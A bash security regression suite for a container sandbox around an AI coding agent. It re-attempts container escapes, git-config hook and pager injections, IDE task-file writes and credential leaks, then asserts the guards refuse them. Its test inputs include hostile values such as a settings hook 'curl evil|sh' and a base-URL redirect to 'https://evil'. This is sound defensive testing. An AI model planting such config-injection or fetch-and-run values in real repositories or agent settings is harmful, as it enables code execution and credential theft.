#!/usr/bin/env bash
# One regression suite for every control the security audit established.
#
# Run it INSIDE a kib sandbox. Each check re-attempts a real attack and asserts the guard still
# refuses it, or re-attempts a legitimate operation and asserts the guard still permits it — a
# control that blocks the attack by breaking the workflow has also failed, so the regression
# half is not optional.
#
#   ./tests/security-test.sh              # everything
#   ./tests/security-test.sh --list       # what it covers, run nothing
#   ./tests/security-test.sh -k git       # only sections matching "git"
#   ./tests/security-test.sh --no-clipboard   # skip the clipboard probe (it alerts the desktop)
#
# NON-DESTRUCTIVE by construction: an exploit is proven dead by showing the write refused and
# the value resolving to nothing — never by running a payload or reading a real secret.
# Fixtures live in tests/.state/sectest and are reused between runs.
#
# ONE file on purpose: it runs inside the sandbox with nothing installed. Only its harness is
# shared (tests/lib.sh, beside it in the same checkout), so both suites report identically.
set -uo pipefail

KIB_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
ARTIFACTS="$KIB_ROOT/tests/.state/sectest"
DO_CLIPBOARD=1
LIST_ONLY=0
KIB_TEST_FILTER=""

while [ $# -gt 0 ]; do
    case "$1" in
        --list) LIST_ONLY=1 ;;
        -k)
            shift
            KIB_TEST_FILTER="${1:-}"
            ;;
        --no-clipboard) DO_CLIPBOARD=0 ;;
        -h | --help)
            sed -n '2,18p' "$0" | sed 's/^# \{0,1\}//'
            exit 0
            ;;
        *)
            echo "unknown option: $1" >&2
            exit 2
            ;;
    esac
    shift
done

if [ "$LIST_ONLY" = 1 ]; then
    grep -oP '^section "\K[^"]+' "$0"
    exit 0
fi

export KIB_TEST_FILTER
# shellcheck source=lib.sh
. "$KIB_ROOT/tests/lib.sh"

# An exploit is dead only if the value ALSO resolves to nothing — the write being refused is
# necessary but not sufficient (an include could still supply it).
resolves_to_nothing() { # resolves_to_nothing <description> <repo> <key>
    active || return 0
    local got
    got="$(git -C "$2" config --get "$3" 2>/dev/null)"
    if [ -z "$got" ]; then pass "$1"; else fail "$1" "$3 resolves to: $got"; fi
}

# ── preflight ────────────────────────────────────────────────────
if [ ! -f /.dockerenv ] && [ "${HOME:-}" != /home/hostuser ]; then
    echo "❌ security-test.sh must run INSIDE a kib sandbox — it probes container-side" >&2
    echo "   guards, and several checks would be meaningless (or messy) on the host." >&2
    exit 2
fi

printf '%skib security regression suite%s  %s%s%s\n' "$T_B" "$T_N" "$T_D" "$(date -u '+%Y-%m-%d %H:%MZ')" "$T_N"

# Fixtures are reused, never recreated: the guard correctly refuses `unlink` of a .git/config,
# so a suite that made fresh repos every run would leave a growing pile of undeletable dirs.
mkdir -p "$ARTIFACTS" 2>/dev/null
fixture() { # fixture <name> [git-init-args…] — echoes its path, creating it once
    local name="$1"
    shift
    local path="$ARTIFACTS/$name"
    # shellcheck disable=SC1007  # GIT_TEMPLATE_DIR= is a deliberate empty per-command env
    [ -e "$path" ] || GIT_TEMPLATE_DIR= git init -q "$@" "$path" 2>/dev/null
    printf '%s' "$path"
}

# Single-container mode is detectable in-session — KIB_FUSE_INTERNAL=1 is inherited by every
# `docker exec`. It changes two expectations vs the sidecar default: the AppArmor profile (the
# in-container mount needs `apparmor=unconfined`) and the /kib/real bind.
SINGLE_FUSE=0
[ "${KIB_FUSE_INTERNAL:-0}" = 1 ] && SINGLE_FUSE=1

# ═════════════════════════════════════════════════════════════════
section "Container boundary — escape classes (info-tier controls)"

is "all capabilities dropped (CapEff)" "0000000000000000" "$(awk '/^CapEff:/{print $2}' /proc/self/status)"
is "CAP_SYS_ADMIN not in the bounding set" "0" "$((0x$(awk '/^CapBnd:/{print $2}' /proc/self/status) & 0x200000 ? 1 : 0))"
is "no-new-privileges set" "1" "$(awk '/^NoNewPrivs:/{print $2}' /proc/self/status)"
is "seccomp in filter mode" "2" "$(awk '/^Seccomp:/{print $2}' /proc/self/status)"
if [ "$SINGLE_FUSE" = 1 ]; then
    # Single mode drops apparmor confinement so the in-container FUSE mount is permitted;
    # SYS_ADMIN is dropped from the bounding set instead (asserted just above + below).
    is "AppArmor unconfined (single-container FUSE mount needs it)" "unconfined" "$(cat /proc/self/attr/current 2>/dev/null | tr -d '\0')"
else
    is "AppArmor confined" "docker-default (enforce)" "$(cat /proc/self/attr/current 2>/dev/null | tr -d '\0')"
fi
is "/proc/sys mounted read-only" "ro" "$(awk '$5=="/proc/sys"{split($6,o,",");print o[1]}' /proc/self/mountinfo | head -1)"
is "/sys mounted read-only" "ro" "$(awk '$5=="/sys"{split($6,o,",");print o[1]}' /proc/self/mountinfo | head -1)"
is "no docker socket" "absent" "$([ -S /var/run/docker.sock ] && echo present || echo absent)"
is "no docker binary" "absent" "$(command -v docker >/dev/null && echo present || echo absent)"
deny "/proc/sys is not writable" bash -c 'echo 1 > /proc/sys/kernel/dmesg_restrict'

syscall_errno() { # syscall_errno <mount|unshare>
    python3 -c "
import ctypes, os, sys
l = ctypes.CDLL('libc.so.6', use_errno=True)
rc = l.mount(b'none', b'/mnt', b'tmpfs', 0, None) if sys.argv[1] == 'mount' else l.unshare(0x00020000)
print('SUCCEEDED' if rc == 0 else os.strerror(ctypes.get_errno()))" "$1"
}
is "mount(2) refused" "Operation not permitted" "$(syscall_errno mount)"
is "unshare(2) refused" "Operation not permitted" "$(syscall_errno unshare)"

# ═════════════════════════════════════════════════════════════════
section "Single-container FUSE mode (macOS / KIB_SINGLE_CONTAINER=1)"

if [ "$SINGLE_FUSE" = 1 ]; then
    # The redacted view is served in-container and mounted over the project path itself (in
    # sidecar mode the same fuse mount arrives by propagation; here it is local). readlink -f:
    # the entrypoint's HOST_HOME symlink means the mount is recorded under the resolved path.
    fuse_at_pwd() {
        local p
        p="$(readlink -f "$PWD")"
        awk -v p="$p" '$2==p && $3 ~ /^fuse/ {print "fuse"; exit}' /proc/self/mounts
    }
    is "redaction is a FUSE mount at the project root" "fuse" "$(fuse_at_pwd)"
    # The real project is exposed to root at /kib/real under a 700 parent; the capless agent
    # must not be able to reach it — every access has to go through the redacting view.
    deny "agent cannot reach the real project at /kib/real" ls /kib/real
    deny "agent cannot traverse the /kib parent" ls /kib
    # The headline property: SYS_ADMIN existed only to mount, and setpriv dropped it from the
    # bounding set before the agent ran.
    is "CAP_SYS_ADMIN dropped from the bounding set (setpriv)" "0" \
        "$((0x$(awk '/^CapBnd:/{print $2}' /proc/self/status) & 0x200000 ? 1 : 0))"
    is "CAP_SETPCAP dropped from the bounding set too" "0" \
        "$((0x$(awk '/^CapBnd:/{print $2}' /proc/self/status) & 0x100 ? 1 : 0))"
else
    skip "single-container FUSE checks" "sidecar mode — relaunch with KIB_SINGLE_CONTAINER=1"
fi

# ═════════════════════════════════════════════════════════════════
section "Host-executed config guard — git (C1–C4, H1, H2)"

REPO="$(fixture repo)"
deny "C1  include.path indirection" git -C "$REPO" config include.path evil.inc
deny "C1b includeIf.gitdir path" git -C "$REPO" config 'includeIf.gitdir:/x/.path' evil.inc
deny "    core.hooksPath (direct)" git -C "$REPO" config core.hooksPath /tmp/evilhooks
deny "    core.fsmonitor (fires on git status)" git -C "$REPO" config core.fsmonitor /tmp/fsm.sh
deny "    core.sshCommand" git -C "$REPO" config core.sshCommand '/tmp/x.sh'
deny "    core.pager" git -C "$REPO" config core.pager '/tmp/x.sh'
deny "    alias.* shell escape" git -C "$REPO" config alias.pwn '!/tmp/x.sh'
deny "C4  filter.*.clean driver" git -C "$REPO" config filter.pwn.clean 'echo pwn'
deny "    submodule.*.update (added after the audit)" git -C "$REPO" config submodule.lib.update '!/tmp/x.sh'
deny "    interactive.diffFilter (added after the audit)" git -C "$REPO" config interactive.diffFilter '/tmp/x.sh'
deny "    gpg.ssh.defaultKeyCommand (added after the audit)" git -C "$REPO" config gpg.ssh.defaultKeyCommand '/tmp/x.sh'
resolves_to_nothing "C1/C4 none of it resolves" "$REPO" core.hooksPath
resolves_to_nothing "    core.fsmonitor resolves to nothing" "$REPO" core.fsmonitor

# C3: the write IS the rename — git never edits config in place, so the validator runs there.
# The inline form is the one a header-only parser used to miss.
config_rename() { # config_rename <repo> <config body>
    local tmp="$1/.git/cfg.candidate"
    printf '%s\n' "$2" >"$tmp" 2>/dev/null || return 1
    mv -f "$tmp" "$1/.git/config" 2>/dev/null
    local rc=$?
    rm -f "$tmp" 2>/dev/null
    return $rc
}
deny "C3  inline [core]hooksPath = … (one-line form)" \
    config_rename "$REPO" '[core]hooksPath = /tmp/evilhooks'
deny "C3b multi-line [core] / hooksPath (regression)" \
    config_rename "$REPO" "$(printf '[core]\n\thooksPath = /tmp/evilhooks')"
deny "C1c a newly added [include] section" \
    config_rename "$REPO" "$(printf '[include]\n\tpath = evil.inc')"

deny "C2  hardlink aliases the protected inode" ln "$REPO/.git/config" "$ARTIFACTS/aliased-config"
deny "    write into .git/hooks" bash -c "mkdir -p '$REPO/.git/hooks'; echo x > '$REPO/.git/hooks/pre-commit'"

BARE="$(fixture bare.git --bare)"
deny "H1  bare repo (dir not named .git) config" git -C "$BARE" config core.hooksPath /tmp/evilhooks
deny "H1b hooks inside the bare repo" bash -c "echo x > '$BARE/hooks/pre-commit'"
resolves_to_nothing "H1  bare repo hooksPath resolves to nothing" "$BARE" core.hooksPath

if [ ! -e "$ARTIFACTS/wt" ]; then
    # shellcheck disable=SC1007  # deliberate empty per-command env
    GIT_TEMPLATE_DIR= git init -q --separate-git-dir="$ARTIFACTS/gd" "$ARTIFACTS/wt" 2>/dev/null
fi
deny "H2  gitfile redirect → separate gitdir" git -C "$ARTIFACTS/wt" config core.fsmonitor /tmp/fsm.sh
resolves_to_nothing "H2  redirected fsmonitor resolves to nothing" "$ARTIFACTS/wt" core.fsmonitor

# Regression half — the guard must not break ordinary git.
allow "regression: benign git config write" git -C "$REPO" config user.name 'Test User'
allow "regression: git config read" git -C "$REPO" config --get user.name
allow "regression: git status" git -C "$REPO" status --short
allow "regression: git remote add" bash -c "git -C '$REPO' remote remove o 2>/dev/null; git -C '$REPO' remote add o https://example.invalid/r.git"
allow "regression: ordinary hardlink" bash -c "echo x > '$ARTIFACTS/hl-src'; ln -f '$ARTIFACTS/hl-src' '$ARTIFACTS/hl-dst'"

# ═════════════════════════════════════════════════════════════════
section "Host-executed config guard — non-git paths"

for p in .vscode/tasks.json .devcontainer/devcontainer.json .idea/workspace.xml .envrc; do
    deny "write $p" bash -c "mkdir -p \"\$(dirname '$ARTIFACTS/$p')\" 2>/dev/null; echo x > '$ARTIFACTS/$p'"
done

# ═════════════════════════════════════════════════════════════════
section "Redaction — .env and .kibignore"

# Staging the probe is itself a write to a redacted path, so it fails once the file exists;
# the read below is what matters. The subshell is load-bearing — a failed redirection is
# reported by the shell performing it, so `2>/dev/null` on the command alone misses it.
(printf 'SECRET=redacted-probe-value\n' >"$ARTIFACTS/.env") 2>/dev/null || true
deny "write .env is refused" bash -c "echo x > '$ARTIFACTS/.env' 2>/dev/null"
if [ -e "$ARTIFACTS/.env" ]; then
    # Compare without printing: a real value must never reach the terminal or a log.
    if grep -q 'redacted-probe-value' "$ARTIFACTS/.env" 2>/dev/null; then
        fail ".env reads as a stub, not its contents" "the real value came through"
    else
        pass ".env reads as a stub, not its contents"
    fi
else
    skip ".env reads as a stub, not its contents" "could not stage a probe file"
fi
allow "regression: .env.example is not redacted" \
    bash -c "echo 'KEY=placeholder' > '$ARTIFACTS/.env.example'"

# ═════════════════════════════════════════════════════════════════
section "Shared config surface — cross-project pivot (H5, H6)"

SHARED="$HOME/.claude-shared"
for d in skills agents commands plugins hooks; do
    if [ -d "$SHARED/$d" ]; then
        deny "shared $d/ is read-only" bash -c "touch '$SHARED/$d/.sectest-probe'"
        rm -f "$SHARED/$d/.sectest-probe" 2>/dev/null
    else
        skip "shared $d/ is read-only" "not present"
    fi
done
# CLAUDE.md is no longer a shared file — kib assembles it (policy + the user's canonical
# memory) straight into the per-project config dir. Assert the policy actually loaded in-box.
_cfg="${CLAUDE_CONFIG_DIR:-$HOME/.claude-session}"
is "sandbox policy is assembled into the in-box CLAUDE.md" "present" \
    "$(grep -q 'kib sandbox policy' "$_cfg/CLAUDE.md" 2>/dev/null && echo present || echo missing)"

# settings.json is deliberately still writable — locking it would break /config.
is "settings.json stays writable (/config must work)" "writable" \
    "$([ -w "$SHARED/settings.json" ] && echo writable || echo 'read-only ***')"
# Broker ON: the real token is gone and a read-only SYNTHETIC placeholder shadows it, so
# read-only is the desired state — never make this writable to "let refresh work", since under
# the broker nothing refreshes by design. Broker OFF: the real credential is copied in
# writable, so in-sandbox Claude can refresh it.
_cred_state="$([ ! -e "$SHARED/.credentials.json" ] || [ -w "$SHARED/.credentials.json" ] && echo writable || echo read-only)"
if [ -n "${ANTHROPIC_BASE_URL:-}" ]; then
    is ".credentials.json is a read-only synthetic placeholder (broker holds a static token)" "read-only" "$_cred_state"
else
    is ".credentials.json stays writable (in-sandbox OAuth refresh, broker off)" "writable" "$_cred_state"
fi

# The lock must not cost in-session authoring: that is what the merge farm buys.
CFG="${CLAUDE_CONFIG_DIR:-$HOME/.claude-session}"
for d in skills agents commands plugins; do
    is "$d/ is a per-project merge farm, not a symlink" "real dir" \
        "$([ -d "$CFG/$d" ] && [ ! -L "$CFG/$d" ] && echo 'real dir' || echo 'symlink ***')"
done
allow "regression: create a skill in-session" bash -c "mkdir -p '$CFG/skills/.sectest' && echo x > '$CFG/skills/.sectest/SKILL.md'"
allow "regression: create an agent in-session" bash -c "echo x > '$CFG/agents/.sectest.md'"
if [ -d "$CFG/plugins/marketplaces" ] && [ ! -L "$CFG/plugins/marketplaces" ]; then
    allow "regression: clone a marketplace per-project" mkdir -p "$CFG/plugins/marketplaces/.sectest"
    rmdir "$CFG/plugins/marketplaces/.sectest" 2>/dev/null
else
    fail "regression: clone a marketplace per-project" \
        "plugins/marketplaces is a symlink into the read-only shared dir — /plugin install will fail"
fi
rm -rf "$CFG/skills/.sectest" "$CFG/agents/.sectest.md" 2>/dev/null

# ── Cross-project isolation: the assembled config is THIS project only ──────────
# canonical ~/.claude holds every project's transcripts, ↑ history and .claude.json entries.
# kib assembles each box from only this project's slice; a leak would surface another
# project's data here. Compared, NEVER printed (other project paths are PII).
MINE="${HOST_PWD:-$PWD}"

if command -v python3 >/dev/null 2>&1 && [ -f "$CFG/.claude.json" ]; then
    _proj="$(
        MINE="$MINE" python3 - "$CFG/.claude.json" <<'PY'
import json, os, sys
mine = os.environ["MINE"]
try:
    data = json.load(open(sys.argv[1]))
except Exception:
    print("unreadable"); sys.exit()
keys = list((data.get("projects") or {}).keys())
print("ok" if keys == [mine] else ("leak:%d" % len(keys) if mine in keys else "missing"))
PY
    )"
    is ".claude.json exposes only this project (no other project entries)" "ok" "$_proj"
else
    skip ".claude.json exposes only this project" "no python3 or no .claude.json"
fi

_slug="$(printf '%s' "$MINE" | sed 's/[^a-zA-Z0-9]/-/g')"
_others=0
if [ -d "$CFG/projects" ]; then
    for _d in "$CFG/projects"/*; do
        [ -e "$_d" ] || continue
        [ "$(basename "$_d")" = "$_slug" ] || _others=$((_others + 1))
    done
fi
is "projects/ holds only this project's transcripts (no cross-project dirs)" "0" "$_others"

if [ -f "$CFG/history.jsonl" ] && command -v python3 >/dev/null 2>&1; then
    _hbad="$(
        MINE="$MINE" python3 - "$CFG/history.jsonl" <<'PY'
import json, os, sys
mine = os.environ["MINE"]; bad = 0
for line in open(sys.argv[1], errors="replace"):
    line = line.strip()
    if not line:
        continue
    try:
        if json.loads(line).get("project") != mine:
            bad += 1
    except Exception:
        pass
print(bad)
PY
    )"
    is "history.jsonl holds only this project's ↑ lines (no cross-project prompts)" "0" "$_hbad"
else
    skip "history.jsonl holds only this project's lines" "no history file or python3"
fi

# The top-level canonical store (which holds every project's data) is not mounted at all —
# only this project's nested binds are — so a cross-project pivot has nothing to read.
is "canonical ~/.claude is not mounted into the sandbox" "absent" \
    "$([ -e "$HOME/.claude/projects" ] || [ -e "$SHARED/projects" ] || [ -e "$SHARED/history.jsonl" ] \
        && echo present || echo absent)"

# ═════════════════════════════════════════════════════════════════
section "Shared settings validator (H5) — host-side, exercised here"

if [ -f "$KIB_ROOT/host/config.sh" ] && command -v python3 >/dev/null; then
    # Against a throwaway ~/.claude; the real canonical config is never touched.
    validator() { # validator <json> — 0 accepted, 1 refused
        local d rc
        d="$(mktemp -d)"
        printf '%s' "$1" >"$d/settings.json"
        (
            export KIB_ROOT
            # shellcheck source=../host/_load.sh
            . "$KIB_ROOT/host/_load.sh"
            # shellcheck disable=SC2034  # host/config.sh reads it across the source boundary
            CLAUDE_HOME="$d"
            validate_shared_settings
        ) >/dev/null 2>&1
        rc=$?
        rm -rf "$d"
        return $rc
    }
    deny "refuses apiKeyHelper" validator '{"apiKeyHelper":"/tmp/x.sh"}'
    deny "refuses awsAuthRefresh" validator '{"awsAuthRefresh":"aws sso login"}'
    deny "refuses otelHeadersHelper" validator '{"otelHeadersHelper":"/tmp/x.sh"}'
    deny "refuses env.ANTHROPIC_BASE_URL" validator '{"env":{"ANTHROPIC_BASE_URL":"https://evil"}}'
    deny "refuses env.ANTHROPIC_API_KEY" validator '{"env":{"ANTHROPIC_API_KEY":"x"}}'
    deny "refuses statusLine.command" validator '{"statusLine":{"command":"/tmp/x.sh"}}'
    deny "refuses inline hooks[].command" validator '{"hooks":{"PreToolUse":[{"hooks":[{"command":"curl evil|sh"}]}]}}'
    allow "accepts an ordinary settings file" validator '{"theme":"dark","env":{"EDITOR":"vim"}}'
    allow "malformed JSON warns, does not block" validator '{not json'
else
    skip "shared settings validator" "host units or python3 unavailable"
fi

# ═════════════════════════════════════════════════════════════════
section "Clipboard mediation (H8)"

if [ "$DO_CLIPBOARD" = 0 ]; then
    skip "clipboard write is refused" "--no-clipboard"
elif ! command -v wl-copy >/dev/null || [ ! -S "${XDG_RUNTIME_DIR:-/run/user/$(id -u)}/${WAYLAND_DISPLAY:-wayland-0}" ]; then
    skip "clipboard write is refused" "no Wayland socket in this container"
else
    deny "clipboard WRITE is refused (raises a host alert)" timeout 5 wl-copy 'kib-sectest-probe'
    allow "regression: clipboard READ still works" timeout 5 wl-paste --list-types
    # The write must not merely error — the selection must be untouched. Compared without
    # printing, so the real clipboard never enters a log.
    if timeout 5 wl-paste 2>/dev/null | grep -qxF 'kib-sectest-probe'; then
        fail "clipboard was not poisoned" "the probe string reached the host clipboard"
    else
        pass "clipboard was not poisoned"
    fi
fi

# ═════════════════════════════════════════════════════════════════
section "Host resolver reach (live-DNS mount)"

if [ -d /run/host-resolve ]; then
    for s in io.systemd.Resolve io.systemd.Resolve.Monitor; do
        deny "connect() to $s is refused" \
            python3 -c "import socket,sys; s=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM); s.connect('/run/host-resolve/$s')"
    done
    allow "regression: resolv.conf is readable" test -r /run/host-resolve/resolv.conf
else
    skip "host resolver sockets shadowed" "no live-DNS mount in this container"
fi

# ═════════════════════════════════════════════════════════════════
section "Credential broker (H3/H4 — real OAuth token kept out of the sandbox)"

# Broker-active is detectable in-session: kib sets ANTHROPIC_BASE_URL on the container and
# every `docker exec` inherits it. NON-DESTRUCTIVE: the credential the sandbox can see is a
# *placeholder* (fake_value_…), so asserting on it reads no real secret.
if [ -n "${ANTHROPIC_BASE_URL:-}" ]; then
    _cred=/home/hostuser/.claude-shared/.credentials.json
    is "the credential in the sandbox is a placeholder, not the real token" fake \
        "$(python3 -c 'import json,sys
try:
    print("fake" if json.load(open(sys.argv[1]))["claudeAiOauth"]["accessToken"].startswith("fake_value_") else "REAL")
except Exception:
    print("ERR")' "$_cred" 2>/dev/null)"

    case "$ANTHROPIC_BASE_URL" in
        *kib-broker* | *host.docker.internal*) pass "ANTHROPIC_BASE_URL routes through the broker ($ANTHROPIC_BASE_URL)" ;;
        *) fail "ANTHROPIC_BASE_URL routes through the broker" "is: $ANTHROPIC_BASE_URL" ;;
    esac

    # This takes precedence over the credentials file, so it is what the agent authenticates
    # with and MUST be the sentinel. "Unset" is NOT evidence of a missing control: Claude
    # scrubs it from the env it hands tool shells, so fall back to the agent's own
    # /proc/<pid>/environ, an exec-time snapshot unaffected by unsetenv(). Never printed.
    _tok="${CLAUDE_CODE_OAUTH_TOKEN:-}"
    if [ -z "$_tok" ]; then
        for _p in $(pgrep -u "$(id -u)" -x claude 2>/dev/null); do
            _tok="$(tr '\0' '\n' <"/proc/$_p/environ" 2>/dev/null \
                | grep -m1 '^CLAUDE_CODE_OAUTH_TOKEN=' || true)"
            [ -n "$_tok" ] && break
        done
    fi
    case "$_tok" in
        *fake_value_*) pass "CLAUDE_CODE_OAUTH_TOKEN is a placeholder (fake_value_…)" ;;
        "") fail "CLAUDE_CODE_OAUTH_TOKEN is set to a placeholder" \
            "unset here and no running agent to read it from — run: kib exec ./tests/security-test.sh" ;;
        *) fail "CLAUDE_CODE_OAUTH_TOKEN is a placeholder" "it is NOT a fake_value_ sentinel — a real token may be in the sandbox" ;;
    esac

    # The broker's real credential + config live in the broker container only — never here.
    deny "the broker's /run/broker is absent from the agent container" test -e /run/broker

    # Regression: brokering must not break the agent reaching the broker, nor host/LAN.
    allow "regression: the broker alias 'kib-broker' resolves" \
        python3 -c "import socket; socket.gethostbyname('kib-broker')"
    allow "regression: host.docker.internal still resolves (host/LAN reach preserved)" \
        python3 -c "import socket; socket.gethostbyname('host.docker.internal')"
    # Root-cause guard for the ENOTFOUND bug: resolv-sync must keep Docker's embedded
    # resolver (127.0.0.11) in resolv.conf, or `kib-broker` stops resolving mid-session.
    if grep -q '127\.0\.0\.11' /etc/resolv.conf 2>/dev/null; then
        pass "embedded DNS 127.0.0.11 kept in resolv.conf (survives resolv-sync — no mid-session ENOTFOUND)"
    else
        fail "embedded DNS 127.0.0.11 kept in resolv.conf" "resolv-sync dropped it — kib-broker will ENOTFOUND"
    fi
else
    skip "credential broker" "not enabled in this container (on by default — 'broker = off', KIB_BROKER=0, or no stored token)"
fi

section "Brokered MCPs (generic credential broker — no MCP secret in the sandbox)"

# A brokered MCP gets a header-free broker URL in this session's .claude.json, with the
# credential only in the sidecar. Assert the in-container invariant: every brokered entry
# targets the broker net with NO auth header, and the host token dir is absent. Skips when none
# exist. (The host-side preventer is unit-tested — it cannot run from inside the sandbox.)
_cfg="${CLAUDE_CONFIG_DIR:-$HOME/.claude}/.claude.json"
_brokered="$(
    python3 - "$_cfg" <<'PY' 2>/dev/null
import json, sys
try:
    d = json.load(open(sys.argv[1]))
except Exception:
    sys.exit(0)
for name, e in (d.get("mcpServers") or {}).items():
    if isinstance(e, dict) and (e.get("_kibBroker") or e.get("_ccBroker")):
        print("%s\t%s\t%s" % (name, e.get("url", ""), "header" if e.get("headers") else "nohdr"))
PY
)"
if [ -n "$_brokered" ]; then
    while IFS="$(printf '\t')" read -r name url hdr; do
        [ -n "$name" ] || continue
        case "$url" in
            https://* | *dataforseo.com* | *googleapis* | *.com/* | *.io/* | *.ai/*)
                fail "brokered MCP '$name' must not target a real upstream" "url=$url — the secret would ride the agent's request"
                ;;
            http://kib-broker:* | http://*:*)
                pass "brokered MCP '$name' targets the broker net, not the upstream ($url)"
                ;;
            *) fail "brokered MCP '$name' has an unexpected url" "url=$url" ;;
        esac
        is "brokered MCP '$name' carries no inline auth header (broker injects it)" "nohdr" "$hdr"
    done <<EOF
$_brokered
EOF
    # The host credential store is never bind-mounted into the agent — only the broker sidecar
    # sees the token.
    deny "the host credential dir ~/.keep-it-in-your-box is absent from the agent container" \
        test -e "$HOME/.keep-it-in-your-box"
else
    skip "brokered MCPs" "none configured (kib broker login <mcp> to add one)"
fi

# ═════════════════════════════════════════════════════════════════
report
rc=$?

if [ "$FAILED" -gt 0 ]; then
    printf '\n%sA failure here means a control the audit relies on has regressed.%s\n' "$T_R" "$T_N"
fi

printf '\n%sFixtures kept in tests/.state/sectest (reused next run — the guard rightly refuses\n' "$T_D"
printf 'to unlink a .git/config, so they cannot be removed from inside). To clear them,\n'
# Repo-relative on purpose: $ARTIFACTS is an IN-CONTAINER path and the two topologies disagree
# about it — single-container mode printed a /home/hostuser/… path labelled "run on the HOST".
printf 'run on the HOST, from the repo root:  rm -rf tests/.state/sectest%s\n' "$T_N"

exit $rc
